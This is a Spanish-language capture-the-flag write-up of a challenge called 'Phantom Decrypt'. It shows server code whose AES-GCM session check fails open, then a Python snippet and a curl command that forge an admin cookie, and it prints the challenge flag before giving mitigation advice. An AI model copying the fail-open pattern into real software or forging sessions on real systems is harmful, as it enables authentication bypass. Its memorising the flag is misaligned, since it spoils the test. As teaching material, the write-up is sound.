# 👻 Phantom Decrypt

> Forjando una sesión admin explotando un `except` demasiado permisivo

| Categoría | Dificultad | Puntos | Autor |
|---|---|---|---|
| Cryptography | 🟡 Medium | 295 | diriartev |

**Flag:** `flag{ae6f1940d1b5af6f}`

---

## 1. Descripción del reto

SecureVault protege sus sesiones con **AES-GCM** (un cifrado autenticado, en teoría muy seguro). La *recovery key* (la flag) solo se muestra en el dashboard cuando el rol de la sesión es `admin`. Solo existe un usuario de prueba (`guest` / `guest123`) con rol `viewer`. A simple vista, sin la clave AES del servidor (aleatoria, 32 bytes, generada en memoria) no debería ser posible forjar una sesión admin.

| | |
|---|---|
| **Instancia** | `9bb1aebd035c2e46.chal.ctf.ae` (HTTPS) |
| **Objetivo** | Conseguir una cookie de sesión con `role=admin` |

## 2. Análisis del código fuente (`app.py`)

Lo interesante es cómo el servidor **descifra** la cookie de sesión:

```python
def decrypt_session(cookie: str) -> dict:
    try:
        raw = base64.b64decode(cookie)
        nonce = raw[:12]
        tag = raw[12:28]
        ciphertext = raw[28:]
        cipher = AES.new(SECRET_KEY, AES.MODE_GCM, nonce=nonce)
        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
        return json.loads(plaintext)
    except Exception:
        session_data = json.loads(base64.b64decode(cookie))
        return session_data
```

Fíjate en el `except Exception`. Si el descifrado AES-GCM falla **por cualquier motivo** (firma inválida, formato incorrecto...), el código **no rechaza** la cookie: la interpreta directamente como JSON en base64, **sin ninguna verificación criptográfica**.

## 3. La vulnerabilidad: *fail open* en la autenticación

AES-GCM es seguro cuando se usa correctamente. Aquí el problema no está en el algoritmo, sino en la lógica de la aplicación: el desarrollador pensó el `except` como un "plan B" para sesiones antiguas o con otro formato, pero en la práctica crea un **bypass total de la autenticación**.

- Si se envía cualquier base64 que **no** sea un blob AES-GCM válido (por ejemplo, un JSON plano en base64), salta la excepción.
- El `except` ejecuta `json.loads(base64.b64decode(cookie))` sobre **nuestros** datos, sin verificar nada.
- `dashboard()` lee `role` de ese diccionario y, si es `admin`, muestra la flag.

## 4. Explotación paso a paso

### Paso 1 — Construir el JSON falso

```json
{"user": "admin", "role": "admin"}
```

### Paso 2 — Codificarlo en base64 (igual que `encrypt_session`, pero sin cifrar)

```python
import base64, json

data = {"user": "admin", "role": "admin"}
token = base64.b64encode(json.dumps(data).encode()).decode()
print(token)
# eyJ1c2VyIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifQ==
```

### Paso 3 — Enviarlo como cookie `session_token` a `/dashboard`

```bash
curl "https://9bb1aebd035c2e46.chal.ctf.ae/dashboard" \
  --cookie "session_token=eyJ1c2VyIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifQ=="
```

**Qué pasa internamente:** el servidor toma los primeros 12 bytes como nonce, los siguientes 16 como tag GCM e intenta descifrar el resto. Como esos bytes no son un ciphertext real firmado con la clave del servidor, `decrypt_and_verify()` lanza una excepción (tag inválido). El flujo cae al `except`, que decodifica nuestro JSON tal cual y nos asigna exactamente el rol que pedimos: `admin`.

## 5. Resultado

El servidor responde con el dashboard de administrador:

```html
<p><b>Admin Recovery Key:</b> flag{ae6f1940d1b5af6f}</p>
```

🚩 **FLAG:** `flag{ae6f1940d1b5af6f}`

## 6. Lección / mitigación

- Nunca deben existir dos caminos distintos para autenticar una sesión (uno cifrado/autenticado y otro "de respaldo" sin verificar). Si el descifrado o la verificación fallan, la única respuesta correcta es **rechazar** la sesión (redirigir a login).
- Revisar con lupa cualquier `except Exception` genérico que rodee lógica de seguridad: suele esconder bypasses de este tipo.
